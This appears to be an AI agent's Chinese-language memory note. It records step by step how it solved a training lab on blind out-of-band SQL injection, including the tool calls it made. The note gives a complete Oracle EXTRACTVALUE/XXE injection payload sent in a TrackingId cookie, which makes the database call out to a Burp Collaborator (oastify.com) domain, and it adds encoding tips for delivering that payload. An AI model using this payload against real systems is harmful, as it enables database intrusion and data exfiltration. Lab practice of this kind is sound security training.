---
metadata:
  node_type: memory
name: "PRS arm A lab-out-of-band"
description: "arm A 基线:lab-out-of-band(OOB 盲注)冷实例一次通过 - TrackingId cookie 注入 Oracle EXTRACTVALUE/XXE 载荷,oastify DNS 回调 4 条,banner solved"
last_updated: 2026-10-09T06:39:09+08:00
created: 2026-10-09T06:39:09+08:00
---

## 2026-10-09 arm A 基线:lab-out-of-band(A 臂冷实例,reused:false)

**结果**:一次通过(单轮注入 + 一次 poll)。实例 `0ac500780470a34d805c083e00db0047`。

**链路**
1. `range_launch launch-url /web-security/sql-injection/blind/lab-out-of-band --jar /tmp/cj1.json` → 17.7s 出 `instance_url`,reused:false。
2. `page_read` 题面:盲注、tracking cookie 异步执行、解 = 让 DB 对 Burp Collaborator 发起 DNS 查询;题面明确说防火墙只放行 Collaborator 域名(即任意自建 OOB 域名会被拦,必须用 oastify.com)。
3. `burp_collab new --state /tmp/bc-oob.json` → `7emv44blo8lyb8lb56gvqz84wv2lqa.oastify.com`。
4. `http_session get <实例>/ --header 'Cookie: TrackingId=<载荷>' --no-body`(不带 jar,避免与自定 Cookie 头重复)。载荷(保持百分号编码原形,勿解码——解码后含空格与 `;` 会截断 Cookie 头):
   `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//7emv44blo8lyb8lb56gvqz84wv2lqa.oastify.com/">%25remote%3b]>'),'/l')+FROM+dual--`
   响应 200、body 11490 与基线一致(异步执行,响应无差分)。
5. `burp_collab poll` → 4 条 DNS 交互(dns_type 1/28,client 3.251.105.106/15、34.245.205.118),`content_length_check: ok`。
6. `banner_verdict` → `solved:true`,`<h4>Congratulations, you solved the lab!</h4>`。

**判据**:OOB 题的证据链 = 载荷投递 → 回调落在自有 collaborator → 横幅翻牌;本题三环都在信封里。

**要点**
- 服务端对 cookie 值做一次 URL 解码:载荷按编码形投递即可,+ → 空格、%3f/%3d/%25/%3a/%3b → 还原,xxe 实体 `%remote;` 闭合。
- `http_session` 的 `sent_cookie` 字段只反映 jar 派生值,自定 Cookie 头仍照发(信封显示 null 不代表没发),勿据此判投放失败。
- 本题无 exploit server(信封 exploit_server:null),交付面就是 cookie 本身。

**开销**:6 次件调用(range_launch / page_read / burp_collab new / http_session / burp_collab poll / banner_verdict)。

